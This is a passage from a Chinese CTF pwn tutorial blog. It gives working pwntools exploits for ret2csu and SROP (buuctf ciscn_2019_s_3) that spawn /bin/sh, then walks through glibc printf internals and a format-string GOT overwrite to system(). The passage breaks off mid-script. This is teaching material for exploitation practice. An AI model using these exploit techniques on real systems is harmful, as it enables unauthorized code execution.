src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数汇编代码" title="vuln函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-4.jpg" srcset="/img/loading.gif" lazyload alt="可利用的指令" title="可利用的指令"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-5.jpg" srcset="/img/loading.gif" lazyload alt="函数列表" title="函数列表"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    先通过write(0,buf,0x30) 获取栈地址，</span><br><span class="hljs-string">    然后将/bin/sh写入栈中，</span><br><span class="hljs-string">    利用ret2csu，设置rdx,rsi为0，</span><br><span class="hljs-string">    然后设置rdi为 /bin/sh 的地址</span><br><span class="hljs-string">    最后调用 execve(&quot;/bin/sh&quot;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>rdi=<span class="hljs-number">0x00000000004005a3</span><br>pops=<span class="hljs-number">0x40059a</span><br>call=<span class="hljs-number">0x400580</span><br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>ret=<span class="hljs-number">0x4005a4</span><br>vuln=<span class="hljs-number">0x4004ed</span><br><br>p=process(<span class="hljs-string">&#x27;./srop&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(vuln)<br>p.sendline(payload)<br>p.read(<span class="hljs-number">0x20</span>)<br>stack=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>+p64(ret)+p64(pops)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(stack+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(call)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(execve)+p64(rdi)+p64(stack)+p64(syscall)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="SROP">SROP</h2><p>利用系统调用sigreturn设置所有寄存器值为栈中的数据</p><p>样例为<code>buuctf</code>中的<code>ciscn_2019_s_3</code>题目</p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-2.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数栈布局" title="vuln函数栈布局"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-3.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数汇编代码" title="vuln函数汇编代码"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-4.jpg" srcset="/img/loading.gif" lazyload alt="可利用的指令" title="可利用的指令"></p><p><img src="/img/blog_img/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E5%8F%8A%E6%A0%88%E6%BA%A2%E5%87%BA/pwn-%E6%A0%88-SROP-5.jpg" srcset="/img/loading.gif" lazyload alt="函数列表" title="函数列表"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    利用SROP 设置寄存器的值，构造read(0,bss,0x300)，并将栈迁移到bss+8上</span><br><span class="hljs-string">    然后再次利用SROP 设置寄存器的值，构造execve(&quot;/bin/sh&quot;) 获取shell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./srop&#x27;</span>)<br>bss=<span class="hljs-number">0x601030</span><br>sig=<span class="hljs-number">0x4004da</span><br>syscall=<span class="hljs-number">0x400517</span><br><br>execve=SigreturnFrame()<br>execve.rdi=bss<br>execve.rsi=<span class="hljs-number">0</span><br>execve.rdx=<span class="hljs-number">0</span><br>execve.rsp=bss+<span class="hljs-number">0x300</span><br>execve.rbp=bss<br>execve.rax=<span class="hljs-number">0x3b</span><br>execve.rip=syscall<br><br>read=SigreturnFrame()<br>read.rdi=<span class="hljs-number">0</span><br>read.rsi=bss<br>read.rdx=<span class="hljs-number">0x300</span><br>read.rsp=bss+<span class="hljs-number">0x8</span><br>read.rbp=bss+<span class="hljs-number">0x100</span><br>read.rax=<span class="hljs-number">0</span><br>read.rip=syscall<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(sig)+p64(syscall)+<span class="hljs-built_in">str</span>(read))<br><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sig)+p64(syscall)+<span class="hljs-built_in">str</span>(execve))<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/page/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/page/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>利用程序直接对用户可控制的数据格式化，让用户可以利用格式化字符串达到任意地址读写<br>因为格式化字符串的参数在栈中，所以尽管无法写，也可以从栈中获取些有用的信息</p><h2 id="格式化详解">格式化详解</h2><p><code>printf</code>实际执行的是位于<code>stdio-common/vfprintf-internal.c</code>文件中的<code>vfprintf函数</code><br>在<code>vfprintf</code>中会按照占位符的顺序输出字符串，但如果占位符中存在<code>$</code>就会执行<code>printf_positional</code>函数<br>在<code>printf_positional</code>函数中会先将 字符串 中所有占位符都搜索出来，储存在数组中，然后遍历数组根据占位符类型输出字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 在格式化字符串时会用到6个这样的表，用来防止存在歧义 */</span><br><span class="hljs-comment">/* Step 0: at the beginning.  */</span><br><span class="hljs-type">static</span> JUMP_TABLE_TYPE step0_jumps[<span class="hljs-number">30</span>] =<br>&#123; <span class="hljs-comment">// 在下面，如果不存在对应类型的参数，则将剩下的参数中的第一个，强制转换为对应参数</span><br>   <span class="hljs-comment">// 说是参数，实际上是栈中的值 在64位中，前六个参数使用寄存器</span><br>  REF (form_unknown),<br>  REF (flag_space),      <span class="hljs-comment">/* for &#x27; &#x27;          使用空格作为填充 默认也是空格*/</span><br>  REF (flag_plus),       <span class="hljs-comment">/* for &#x27;+&#x27;          在正数前面添加 &#x27;+&#x27; */</span><br>  REF (flag_minus),      <span class="hljs-comment">/* for &#x27;-&#x27;          右对齐*/</span><br>  REF (flag_hash),       <span class="hljs-comment">/* for &#x27;&lt;hash&gt;&#x27; #     使用#号触发 与x 组合表示使用 0x??的格式 与 X组合表示使用 0X??的格式</span><br><span class="hljs-comment">                                                             与g/G 组合表示用0填充小数位*/</span><br>  REF (flag_zero),       <span class="hljs-comment">/* for &#x27;0&#x27;          使用0作为填充仅在左对齐时有效*/</span><br>  REF (flag_quote),      <span class="hljs-comment">/* for &#x27;\&#x27;&#x27;         暂时不知道用处*/</span><br>  REF (width_asterics),  <span class="hljs-comment">/* for &#x27;*&#x27;          从printf后面的参数中获取整数类型参数作为输出宽度 宽度不能大于2147483647*/</span><br>  REF (width),           <span class="hljs-comment">/* for &#x27;1&#x27;...&#x27;9&#x27;    这一条没有明确代码，但与 width_asterics 在一起执行，将字符串转换为整数 宽度不能大于2147483647</span><br><span class="hljs-comment">                     当数字后面是 $ 字符时，将数字作为偏移 */</span><br>  REF (precision),       <span class="hljs-comment">/* for &#x27;.&#x27;          在搜索到 . 之后，如果后面的字符为 * 则将printf 中未使用过的参数中的整数作为小数长度位</span><br><span class="hljs-comment">                                                                    如果后面的字符为数字，就将数字作为小数位长度*/</span><br>  REF (mod_half),        <span class="hljs-comment">/* for &#x27;h&#x27;          将数据当作 二字节数据处理 ，但如果两个h连在一起 则将数据作为 一字节数据处理*/</span><br>  REF (mod_long),        <span class="hljs-comment">/* for &#x27;l&#x27;          将数据作为 四字节数据处理*/</span><br>  REF (mod_longlong),    <span class="hljs-comment">/* for &#x27;L&#x27;, &#x27;q&#x27;     将数据作为 八字节数据处理*/</span><br>  REF (<span class="hljs-type">mod_size_t</span>),      <span class="hljs-comment">/* for &#x27;z&#x27;, &#x27;Z&#x27;     通过 size_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (form_percent),    <span class="hljs-comment">/* for &#x27;%&#x27;          输出 %*/</span><br>  REF (form_integer),    <span class="hljs-comment">/* for &#x27;d&#x27;, &#x27;i&#x27;     将数据以十进制有符号整型的方式输出*/</span><br>  REF (form_unsigned),   <span class="hljs-comment">/* for &#x27;u&#x27;          将数据以十进制无符号整型的方式输出*/</span><br>  REF (form_octal),      <span class="hljs-comment">/* for &#x27;o&#x27;          将数据以八进制无符号整型的方式输出*/</span><br>  REF (form_hexa),       <span class="hljs-comment">/* for &#x27;X&#x27;, &#x27;x&#x27;     将数据以十六进制无符号整型的方式输出</span><br><span class="hljs-comment">                                                    使用X表示以大写十六进制输出</span><br><span class="hljs-comment">                                                    使用x表示以小写十六进制输出*/</span><br>  REF (form_float),      <span class="hljs-comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27;   e/E 表示以指数的形式输出小数，区别为输出时e的大小写</span><br><span class="hljs-comment">                                                           f/F 表示以普通小数的形式输出小数，区别在于 当小数为无限小数或小数位过长时，输出的 inf,infinity,nan的大小写</span><br><span class="hljs-comment">                                                           g/G 按数值大小自动区分使用e或f 区别也是大小写*/</span><br>  REF (form_character),  <span class="hljs-comment">/* for &#x27;c&#x27;          将参数中剩下的第一个整数作为字符输出*/</span><br>  REF (form_string),     <span class="hljs-comment">/* for &#x27;s&#x27;, &#x27;S&#x27;     将printf参数中第一个参数，作为字符指针，输出指向的字符串*/</span><br>  REF (form_pointer),    <span class="hljs-comment">/* for &#x27;p&#x27;          将printf参数中第一个指针 使用 %#x 的形式输出 当指针不存在时 使用整数*/</span><br>  REF (form_number),     <span class="hljs-comment">/* for &#x27;n&#x27;          将当前输出的长度，写入到printf参数中剩下的第一个参数指向的位置*/</span><br>  REF (form_strerror),   <span class="hljs-comment">/* for &#x27;m&#x27;          按照当前错误信息输出错误，当没有错误时输出 Success*/</span><br>  REF (form_wcharacter), <span class="hljs-comment">/* for &#x27;C&#x27;          将printf参数中剩下的第一个 wchar_t 类型的参数，输出*/</span><br>  REF (form_floathex),   <span class="hljs-comment">/* for &#x27;A&#x27;, &#x27;a&#x27;     按照十六进制的形式输出小数*/</span><br>  REF (<span class="hljs-type">mod_ptrdiff_t</span>),   <span class="hljs-comment">/* for &#x27;t&#x27;          通过 ptrdiff_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (<span class="hljs-type">mod_intmax_t</span>),    <span class="hljs-comment">/* for &#x27;j&#x27;          通过 intmax_t 判断 将数据作为 四字节 还是 八字节处理*/</span><br>  REF (flag_i18n),       <span class="hljs-comment">/* for &#x27;I&#x27;          暂时不知道用处*/</span><br>&#125;;<br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">数据宽度</th><th>作用</th></tr></thead><tbody><tr><td style="text-align:center">h</td><td>将数据作为<code>short</code>类型处理</td></tr><tr><td style="text-align:center">hh</td><td>将数据作为<code>char</code>类型处理</td></tr><tr><td style="text-align:center">l</td><td>将数据作为<code>long</code>类型处理</td></tr><tr><td style="text-align:center">q/L</td><td>将数据作为<code>long long</code>类型处理</td></tr><tr><td style="text-align:center">z/Z</td><td>通过<code>size_t</code>判断，将数据作为<code>long</code>类型处理还是以<code>long long</code>类型处理</td></tr></tbody></table><table><thead><tr><th style="text-align:center">标志</th><th>作用</th></tr></thead><tbody><tr><td style="text-align:center">space</td><td>使用空格作为填充符号</td></tr><tr><td style="text-align:center">+</td><td>在正数的前面添加<code>+</code> 输入时输入+ 可以省略一个值的输入</td></tr><tr><td style="text-align:center">-</td><td>右对齐(默认左对齐) 输入时输入- 可以省略一个值的输入</td></tr><tr><td style="text-align:center">#</td><td>与<code>x/X</code>组合表示以<code>0x???</code>的形式输出，与<code>g/G</code>组合表示不省略小数结尾的<code>0</code></td></tr><tr><td style="text-align:center">0</td><td>表示使用0作为填充符号(仅右对齐时有效)</td></tr><tr><td style="text-align:center">*</td><td>将参数中最前面的整数作为输出数据的最小长度 (最大为<code>2147483647</code>)</td></tr><tr><td style="text-align:center">0~9</td><td>将字符串转换后的整数作为输出数据的最小长度 (最大为<code>2147483647</code>，为负数时表示右对齐)</td></tr><tr><td style="text-align:center">$</td><td>通过<code>$</code>前的数字获取参数的索引值，用于指定占位符处理的数据</td></tr><tr><td style="text-align:center">.</td><td>.数字 用来指定浮点数精度 或 字符串输出的最大长度</td></tr></tbody></table><table><thead><tr><th style="text-align:center">类型</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:center">x</td><td style="text-align:left">将无符号整型以全小写十六进制的形式输入输出</td></tr><tr><td style="text-align:center">X</td><td style="text-align:left">将无符号整型以全大写十六进制的形式输入输出</td></tr><tr><td style="text-align:center">o</td><td style="text-align:left">将无符号整型以八进制的形式输入输出</td></tr><tr><td style="text-align:center">u</td><td style="text-align:left">将无符号整型以十进制的形式输入输出</td></tr><tr><td style="text-align:center">d</td><td style="text-align:left">将有符号整型以十进制的形式输入输出</td></tr><tr><td style="text-align:center">i</td><td style="text-align:left">输入输出有符号整型(将开头为0的数字识别为八进制，将开头为0x的数字识别为十六进制)</td></tr><tr><td style="text-align:center">f</td><td style="text-align:left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">F</td><td style="text-align:left">以定点数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">e</td><td style="text-align:left">以指数表示法输出浮点数 (当浮点数 为 无限浮点数时输出<code>inf</code>,当 浮点数 无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">E</td><td style="text-align:left">以指数表示法全大写输出浮点数 (当浮点数 为 无限浮点数时输出<code>INF</code>,当 浮点数 无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">g</td><td style="text-align:left">自动选择使用定点数或指数输出浮点数(效果为<code>f</code>和<code>e</code>的结合体)</td></tr><tr><td style="text-align:center">G</td><td style="text-align:left">自动选择使用定点数或指数输出浮点数(效果为<code>F</code>和<code>E</code>的结合体)</td></tr><tr><td style="text-align:center">a</td><td style="text-align:left">以十六进制的形式全小写输出浮点数(当小数为无限小数时输出<code>inf</code>,当小数无法作为数字处理时输出<code>nan</code>)</td></tr><tr><td style="text-align:center">A</td><td style="text-align:left">以十六进制的形式全大写输出浮点数(当小数为无限小数时输出<code>INF</code>,当小数无法作为数字处理时输出<code>NAN</code>)</td></tr><tr><td style="text-align:center">s</td><td style="text-align:left">输出指定地址中的数据 (以<code>\x00</code>截断) 输入时以<code>空格</code>或<code>\n</code>为截断</td></tr><tr><td style="text-align:center">S</td><td style="text-align:left">输出指定地址中的数据 (以<code>\x00</code>或无法识别的数值截断)，输入时以<code>空格</code>或<code>\n</code>为截断，每四字节为一个字符输入输出</td></tr><tr><td style="text-align:center">p</td><td style="text-align:left">以十六进制的形式输出 地址/整数 (当 地址/整数为 0 时输出 <code>(nil)</code> )</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">以字符的形式输入输出数据</td></tr><tr><td style="text-align:center">n</td><td style="text-align:left">将已经输出的数据长度 写入指定地址</td></tr><tr><td style="text-align:center">====</td><td style="text-align:left">=============================================================================</td></tr></tbody></table><blockquote><p>使用 f/F/e/E/g/G 输入 都可以识别 定点数表示法 和 指数表示法</p></blockquote><p>计算偏移<br>-&gt; x86_64<br>—&gt; 通过 (需要使用的地址-调用printf时的rsp)/8+6 获得<br>—&gt; 因为printf参数中除第一个为需要格式化的字符串，其他都是参数，<br>—&gt; 如果要获取rsi,rdx,rcx,r8,r9寄存器的值就使用 <code>0 &lt; s &lt; 6</code> 的偏移<br>-&gt; x86<br>—&gt; 通过 (需要使用的地址-调用printf时的esp)/4 获得</p><p>通过<code>n</code>进行任意写，通过<code>s</code>进行任意地址读，通过<code>p</code>获取栈中的数据</p><h2 id="栈中格式化字符串">栈中格式化字符串</h2><blockquote><p>在栈中的格式化字符串比较简单，因为可以通过字符串中的地址，达到任意地址读写</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* 示例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x100</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,a);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(a,<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-number">4</span>))&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(a);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/* 编译命令</span><br><span class="hljs-comment">    gcc pwn_format.c  -no-pie -o pwn_format </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format.jpg" srcset="/img/loading.gif" lazyload alt="main函数" title="main函数代码(在此之前都是初始化变量的代码)"><br><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为 main 函数是由 __libc_start_main 函数调用，</span><br><span class="hljs-string">    那么在栈中就一定存在 __libc_start_main 函数的地址，</span><br><span class="hljs-string">    通过获取 __libc_start_main 函数的地址可以获取到 libc的基地址 ，</span><br><span class="hljs-string">    然后通过基地址获取 system 函数的地址，</span><br><span class="hljs-string">    再设置程序 got表 中 printf 项的值为 system 函数地址，</span><br><span class="hljs-string">    这样每次在执行 printf 函数时就会执行 system 函数</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot; %41$p 计算过程</span><br><span class="hljs-string">    去除寄存器占用的 5 个参数，</span><br><span class="hljs-string">    那么字符串开头的偏移为 %6$p,</span><br><span class="hljs-string">    因为main函数的栈占用 0x110 字节，</span><br><span class="hljs-string">    再加上 push rbp ，所占用的 8 字节，</span><br><span class="hljs-string">    格式化的字符串开头到 __libc_start_main 之间 0x118 字节的数据，</span><br><span class="hljs-string">    所以 __libc_start_main 函数地址的偏移就为 0x118/8+6=41 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>printf_got=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_got))<br>p.sendline(<span class="hljs-string">&#x27;%41$p&#x27;</span>)<br>libc.address=<span class="hljs-built_in">int</span>(p.read(),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">213</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>data=p64(system)<br>fs=&#123;&#125;<br>n=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]<br>i=<span class="hljs-number">7</span><br><span class="hljs-keyword">while</span> i&gt;-<span class="hljs-number">1</span>:<br>    fs[i]=<span class="hljs-built_in">ord</span>(data[i])<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>*i+p64(printf_got+i)[:-<span class="hljs-number">1</span>]<br>    p.sendline(payload)<br>    i=i-<span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    构造栈，使栈中存有 printf.got~printf.got+7 这八个地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>n.sort(key=<span class="hljs-keyword">lambda</span> d:fs[d])<br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">8</span>:<br>    <span class="hljs-keyword">if</span> fs[n[i]]==<span class="hljs-number">0</span>:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> fs[n[i]]-fs[n[i-<span class="hljs-number">1</span>]]==<span class="hljs-number">0</span>:<br>            payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(fs[n[i]]-fs[n[i-<span class="hljs-number">1</span>]])+<span class="hljs-string">&#x27;c%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">18</span>+n[i])+<span class="hljs-string">&#x27;$hhn&#x27;</span><br>    i=i+<span class="hljs-number">1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    这里是按照 system函数地址中每个字节所表示的数值，从小到大排列，防止修改时互相干扰</span><br><span class="hljs-string">    一般格式化字符串修改的数据宽度尽量要小，</span><br><span class="hljs-string">    因为数据宽度越大，表示在此之前输出的长度越长，</span><br><span class="hljs-string">    可能会导致将payload发送到靶机之后，</span><br><span class="hljs-string">    本地窗口一直在获取靶机中输出的内容，</span><br><span class="hljs-string">    这种情况非常浪费时间</span><br><span 